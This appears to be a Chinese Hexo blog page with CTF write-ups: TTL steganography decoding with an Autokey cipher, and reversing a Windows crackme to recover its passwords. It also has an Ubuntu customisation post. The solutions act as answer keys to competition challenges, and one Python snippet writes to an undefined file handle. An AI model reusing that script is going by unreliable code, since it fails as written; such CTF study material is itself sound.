+<p><strong>如：须传送H字符，只需把H字符换成二进制，每两位为一组，每次填充到TTL字段的开头两位并把剩下的6位设置为1（xx111111），这样发4个IP报文即可传送1个字节。</strong>	  –摘自<a target="_blank" rel="noopener" href="https://wooyun.js.org/drops/%E6%95%B0%E6%8D%AE%E9%9A%90%E8%97%8F%E6%8A%80%E6%9C%AF.html">此处</a></p>
+<h2 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h2><blockquote>
+<p>My thought</p>
+</blockquote>
+<p>于是思路有了，想到把TTL直接用python按下列替换</p>
+<ul>
+<li>63 &#x3D; 00111111</li>
+<li>127 &#x3D; 01111111</li>
+<li>191 &#x3D; 10111111</li>
+<li>255 &#x3D; 11111111</li>
+</ul>
+<p>但是想到要提取前2位，所以我们按下列替换</p>
+<ul>
+<li>TTL&#x3D;63 -&gt; 00</li>
+<li>TTL&#x3D;127-&gt; 01</li>
+<li>TTL&#x3D;191-&gt; 10</li>
+<li>TTL&#x3D;255-&gt; 11</li>
+<li>“\n”     -&gt; “”(趁机把换行替换)</li>
+</ul>
+<p>py脚本类似下方</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">fp1=open(&quot;ttl.txt&quot;,&quot;r&quot;)</span><br><span class="line">fp2=open(&quot;ttl_1.txt&quot;,&quot;w&quot;)</span><br><span class="line"> </span><br><span class="line">for s in fp1.readlines():#读出</span><br><span class="line">    fp4.write(s.replace(&quot;TTL=63&quot;,&quot;00&quot;)) #替换并写入</span><br><span class="line">fp1.close()</span><br><span class="line">fp2.close()</span><br></pre></td></tr></table></figure>
+
+<p>之后我们得到一串二进制数字（具体是295326组），然后我们就要把这串数字转换为字符串</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">import re</span><br><span class="line">aa=&quot;(那串数字，当然打开文件也可以)&quot;</span><br><span class="line">bb=re.findall(r&#x27;.&#123;8&#125;&#x27;,aa)#以八位为一组进行读取</span><br><span class="line">str1 = &quot;&quot;</span><br><span class="line">for b in bb:</span><br><span class="line">    str1 += chr(int(b,2))</span><br><span class="line"></span><br><span class="line">print(str1)</span><br></pre></td></tr></table></figure>
+
+<p>终于得到了一堆二进制数字看到开头是<strong>FFD8FF</strong>，我们可以直接将这串字符串另存为png格式（就叫a.png），奇迹发生了，是1&#x2F;6个二维码，我们想到应该是图片分离，利用<br><code>foremost a.png</code>得到六个二维码，<strong>画图</strong>大法直接拼接即可扫码，然后就得到二位码内容</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">key:AutomaticKey </span><br><span class="line">cipher:fftu&#123;2028mb39927wn1f96o6e12z03j58002p&#125;</span><br></pre></td></tr></table></figure>
+
+<p>看到<strong>AutomaticKey</strong>我们就理解了，本题是<strong>Autokey Cipher</strong>，我们直接到这<a target="_blank" rel="noopener" href="http://www.practicalcryptography.com/ciphers/classical-era/autokey/">在线解题</a>,得到flag？？怎么比原来短了，看了看发现，哦，数字都消失了，没事，我们直接手动填写，Get！</p>
+<h2 id="Summary"><a href="#Summary" class="headerlink" title="Summary"></a>Summary</h2><blockquote>
+<p>A zibi day</p>
+</blockquote>
+<p>今天做西湖论剑，本来本人想做逆向和pwn，结果全程划水，就解了几道题，还没逆向和pwn，看了看杂项和密码，把最简单的做了。逆向第一题是C++的时候心态都爆了，之后心情极度难受，主要还是太菜了，焦灼等待writeup，继续学习啊~</p>
+<h2 id="Link"><a href="#Link" class="headerlink" title="Link"></a>Link</h2><blockquote>
+<p><a target="_blank" rel="noopener" href="https://github.com/pic4xiu/C/blob/master/%E9%A2%98%E7%9B%AE%E9%93%BE%E6%8E%A5/TTL.txt">TTL</a></p>
+</blockquote>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2019/04/07/2019-04-07-ttl/" data-id="cuida2KSoEkVHY3VMPv_125Yi" data-title="西湖论剑" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CTF/" rel="tag">CTF</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+    <article id="post-2019-04-06-U1st" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2019/04/06/2019-04-06-U1st/" class="article-date">
+  <time class="dt-published" datetime="2019-04-05T16:00:00.000Z" itemprop="datePublished">2019-04-06</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2019/04/06/2019-04-06-U1st/">Ubuntu beautify</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h2 id="Foreword"><a href="#Foreword" class="headerlink" title="Foreword"></a>Foreword</h2><blockquote>
+<p>Today is happy:)</p>
+</blockquote>
+<p>昨天清明节打awd比赛划水,搞得自己很累,今天就疯狂偷懒,没学习二进制,搞了一下ubuntu的美化,还是中等满意吧</p>
+<h2 id="Goal"><a href="#Goal" class="headerlink" title="Goal"></a>Goal</h2><blockquote>
+<p>Ubuntu in my heart</p>
+</blockquote>
+<p>之前也整了一下美化,最后发现3D效果太多,经常直接卡死,必须重启图形界面,于是就决定不玩特效(虽然很好看,但很不稳定),搞一搞好玩的东西,自己喜欢就行:)</p>
+<h2 id="Text"><a href="#Text" class="headerlink" title="Text"></a>Text</h2><blockquote>
+<p>Some step</p>
+</blockquote>
+<p>主题神马的网上都有,我们说些别的(我们默认unity-tweak-tool已经装好),首先上<a target="_blank" rel="noopener" href="https://extensions.gnome.org/">此网站</a>下载自己的应用,我用着<strong>Coverflow alt-tab</strong><br>美化切换界面,还有<strong>Dash to dock</strong>用来实现类似macos一样的dock,两个设置不算难,自己试试决定自己喜欢的.说完拓展我们看一些神器</p>
+<ul>
+<li>Albert    用来实现全局搜索功能,类似Windows的everything</li>
+<li><a target="_blank" rel="noopener" href="https://github.com/erguotou520/electron-ssr/releases">eletrone-ssr</a>    科学上网工具,配起来也是图形界面,傻瓜式</li>
+<li>搜狗输入法 自带的输入法经常有bug,这个必装</li>
+<li><a target="_blank" rel="noopener" href="https://github.com/askme765cs/Wine-QQ-TIM">Tim</a>     虽然腾讯不出Linux版,但还是有大神通过wine搞好了,虽然有各种bug,但聊胜于无</li>
+</ul>
+<p>还有一些安装起来可能会有各种bug,毕竟问题千奇百怪,也不好统一,大家可自行通过网络解决(比如我装网易云的时候竟然要在命令行用sudo权限)</p>
+<p>嗯,再推荐一个好玩的Conky,这个是监控本机硬件情况的软件,并实时显示,搭好就像本背景一样,语法极其简单,大家可以玩一下.</p>
+<h2 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h2><blockquote>
+<p>Going a lot of detours</p>
+</blockquote>
+<p>今天基本都在配置环境,总有一些我忍不了的bug,然后我就抛弃gnome,转投kde和unity的怀抱，最后还是滚回搞<strong>gnome</strong>了。（糟糕，好像字数太少，再水点）</p>
+<h2 id="Goal-1"><a href="#Goal-1" class="headerlink" title="Goal"></a>Goal</h2><blockquote>
+<p>What I want to do</p>
+</blockquote>
+<p>在Linux下虽然也有类似Windows下的<strong>everything</strong>一样的神器,但是用Linux就免不了和终端打交道,但是我们输入<code>xdg-open .</code>命令过于复杂,所以我们用一个简单的命令将其替代,如<code>o</code></p>
+<p>在<strong>bin</strong>中存放这大量的命令,这些的绝大部分我们都可以在终端直接敲,马上运行,所以我们可以把命令通过软链接的导入其中</p>
+<h2 id="Code"><a href="#Code" class="headerlink" title="Code"></a>Code</h2><p>我们新建一个文件,如叫做<strong>open</strong>,在本文件中写入我们要想其为我们执行的操作,如<code>xdg-open . &amp;</code>我们直接使用</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo ln -s /home/pic/文档/o /usr/bin/o</span><br></pre></td></tr></table></figure>
+
+<p>我们在终端输入<code>o</code>就可以直接进入本目录了,当然还有很多</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2019/04/06/2019-04-06-U1st/" data-id="cuid-1FuvO1c1ak3jIFKiQ_Cf" data-title="Ubuntu beautify" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/misc/" rel="tag">misc</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+    <article id="post-2019-03-30-嘉韦思" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2019/04/01/2019-03-30-%E5%98%89%E9%9F%A6%E6%80%9D/" class="article-date">
+  <time class="dt-published" datetime="2019-03-31T16:00:00.000Z" itemprop="datePublished">2019-04-01</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2019/04/01/2019-03-30-%E5%98%89%E9%9F%A6%E6%80%9D/">嘉韦思杯</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h2 id="Auth"><a href="#Auth" class="headerlink" title="Auth"></a>Auth</h2><blockquote>
+<p>An easy Windows re</p>
+</blockquote>
+<h2 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h2><blockquote>
+<p>Run it and see what happened</p>
+</blockquote>
+<p>直接运行后</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">            .</span><br><span class="line">           _|_    ROBOTIC AUTHENTICATION SYSTEM</span><br><span class="line">    /\/\  (. .)  /</span><br><span class="line">    `||&#x27;   |#|</span><br><span class="line">     ||__.-&quot;-&quot;-.___</span><br><span class="line">     `---| . . |--.\</span><br><span class="line">         | : : |  ,||,</span><br><span class="line">         `..-..&#x27;  \/\/</span><br><span class="line">          || ||</span><br><span class="line">          || ||</span><br><span class="line">         |__|__|</span><br><span class="line"></span><br><span class="line">Please enter the first Password:</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>可知这是一个命令行的算法分析题，用peid查壳后没壳，我们直接拖到ida进行下一步分析，<code>shift+F12</code>后找到之前出现的关键字符串后查找引用找到</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">if ( !strcmp(&amp;Str1, Str2) )</span><br><span class="line">&#123;</span><br><span class="line">  puts(&quot;You passed level1!&quot;);</span><br><span class="line">  sub_4015EA(0);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>在加上之前出现的<code>strcpy(Str2, &quot;r0b0RUlez!&quot;)</code>我们直接输入**r0b0RUlez!**后出现</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Please enter the second Password:</span><br></pre></td></tr></table></figure>
+
+<p>成功进入下一关，我们应该注意到这些字符串应该是程序在运行后生成的（在ida字符串中未找到，这题动态调试会更好一些，但鉴于本题不难，我们直接强行静态分析也不难）</p>
+<p>这时候我很好奇之前函数为什么定义了那么多字符串，回去看看之前的<code>puts(dword_40AD8C)</code>就懂了，这串数已变，向上找找到了**sub_401500(0)**这函数。我们分析一下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">int __cdecl sub_401500(signed int a1)</span><br><span class="line">&#123;</span><br><span class="line">  int result; // eax@2</span><br><span class="line">  _BYTE *i; // [sp+1Ch] [bp-Ch]@3</span><br><span class="line"></span><br><span class="line">  if ( a1 &gt; 9 )</span><br><span class="line">  &#123;</span><br><span class="line">    for ( i = (_BYTE *)dword_40AD94; ; ++i )</span><br><span class="line">    &#123;</span><br><span class="line">      result = dword_40ADA0;</span><br><span class="line">      if ( (unsigned int)i &gt;= dword_40ADA0 )</span><br><span class="line">        break;</span><br><span class="line">      *i ^= 1u;                                     //关键代码，将每位和1进行异或</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  else</span><br><span class="line">  &#123;</span><br><span class="line">    result = sub_401500(a1 + 1);</span><br><span class="line">  &#125;</span><br><span class="line">  return result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>就是这个函数把我们的字符串进行了加工，我们接着<strong>sub_4015EA</strong>这个函数走，发现它在</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">puts(dword_40AD90);</span><br><span class="line">dword_40ADA8 = 0x401619;</span><br><span class="line">__debugbreak();</span><br><span class="line">result = 0;</span><br></pre></td></tr></table></figure>
+
+<p>跳转之前改变了<strong>dword_40ADA8</strong>这个值，我们通过它跳到了<strong>sub_40157F</strong>中</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">void __cdecl __noreturn sub_40157F(int a1)</span><br><span class="line">&#123;</span><br><span class="line">  char v1; // [sp+18h] [bp-20h]@2</span><br><span class="line">  int v2; // [sp+2Ch] [bp-Ch]@1</span><br><span class="line"></span><br><span class="line">  v2 = *(_DWORD *)(*(_DWORD *)(a1 + 4) + 184);</span><br><span class="line">  if ( v2 == dword_40ADA8 + 6 )</span><br><span class="line">  &#123;</span><br><span class="line">    scanf(&quot;%20s&quot;, &amp;v1);</span><br><span class="line">    if ( !sub_401547(&amp;v1, (_BYTE *)dword_40AD98) )</span><br><span class="line">      puts(Str);</span><br><span class="line">  &#125;</span><br><span class="line">  ExitProcess(0);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>发现最后的函数为<strong>sub_401547</strong>：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">signed int __cdecl sub_401547(_BYTE *a1, _BYTE *a2)</span><br><span class="line">&#123;</span><br><span class="line">  while ( *a2 != 2 )</span><br><span class="line">  &#123;</span><br><span class="line">    if ( *a1 != (*a2 ^ 2) )</span><br><span class="line">      return 1;</span><br><span class="line">    ++a1;</span><br><span class="line">    ++a2;</span><br><span class="line">  &#125;</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>输入字符串与<strong>u1nnf2lg</strong>和2的异或进行比对，最后两个字符串拼接即得flag:)，本题不算难，找好跳转就能一步一步解决．</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2019/04/01/2019-03-30-%E5%98%89%E9%9F%A6%E6%80%9D/" data-id="cuidOV6czC9_HJ5-2EyFy8kxc" data-title="嘉韦思杯" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CTF/" rel="tag">CTF</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+
+
+  <nav id="page-nav">
+    
+    <a class="extend prev" rel="prev" href="/page/4/">&laquo; Prev</a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/3/">3</a><a class="page-number" href="/page/4/">4</a><span class="page-number current">5</span><a class="page-number" href="/page/6/">6</a><a class="extend next" rel="next" href="/page/6/">Next &raquo;</a>
+  </nav>
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Categories</h3>
+    <div class="widget">
+      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/AI/">AI</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/pwn/">pwn</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/tools/">tools</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tags</h3>
+    <div class="widget">
+      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/CTF/" rel="tag">CTF</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Fuzz/" rel="tag">Fuzz</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Misc/" rel="tag">Misc</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Web/" rel="tag">Web</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ai/" rel="tag">ai</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/chat/" rel="tag">chat</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/fuzz/" rel="tag">fuzz</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/misc/" rel="tag">misc</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/pwn/" rel="tag">pwn</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/python/" rel="tag">python</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/tools/" rel="tag">tools</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tag Cloud</h3>
+    <div class="widget tagcloud">
+      <a href="/tags/CTF/" style="font-size: 17.5px;">CTF</a> <a href="/tags/Fuzz/" style="font-size: 10px;">Fuzz</a> <a href="/tags/Misc/" style="font-size: 12.5px;">Misc</a> <a href="/tags/Web/" style="font-size: 12.5px;">Web</a> <a href="/tags/ai/" style="font-size: 10px;">ai</a> <a href="/tags/chat/" style="font-size: 15px;">chat</a> <a href="/tags/fuzz/" style="font-size: 10px;">fuzz</a> <a href="/tags/misc/" style="font-size: 17.5px;">misc</a> <a href="/tags/pwn/" style="font-size: 20px;">pwn</a> <a href="/tags/python/" style="font-size: 10px;">python</a> <a href="/tags/tools/" style="font-size: 10px;">tools</a>
+    </div>
+  </div>
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Archives</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2025/10/">October 2025</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/06/">June 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/05/">May 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/04/">April 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/03/">March 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/01/">January 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/10/">October 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/09/">September 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/07/">July 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/01/">January 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/09/">September 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/08/">August 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/07/">July 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/06/">June 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/02/">February 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/11/">November 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/10/">October 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/09/">September 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/08/">August 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/06/">June 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/05/">May 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/04/">April 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/03/">March 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/1999/08/">August 1999</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/1999/01/">January 1999</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Recent Posts</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2025/10/01/hello-world/">Hello World</a>
+          </li>
+        
+          <li>
+            <a href="/2023/06/27/2023-06-27-fuzzer/">如何完成一个 fuzzer</a>
+          </li>
+        
+          <li>
+            <a href="/2023/05/31/2023-05-31-report/">安全开发</a>
+          </li>
+        
+          <li>
+            <a href="/2023/05/31/2023-06-18-fixandPR/">记一次 fuzz go 的一个第三方库</a>
+          </li>
+        
+          <li>
+            <a href="/2023/05/23/2023-05-23-waf/">AI 安全之</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      
+      &copy; 2025 John Doe<br>
+      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+
+<script src="/js/jquery-3.6.4.min.js"></script>
+
+
+
+  
+<script src="/fancybox/jquery.fancybox.min.js"></script>
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+
+
+  </div>
+</body>
+</html>
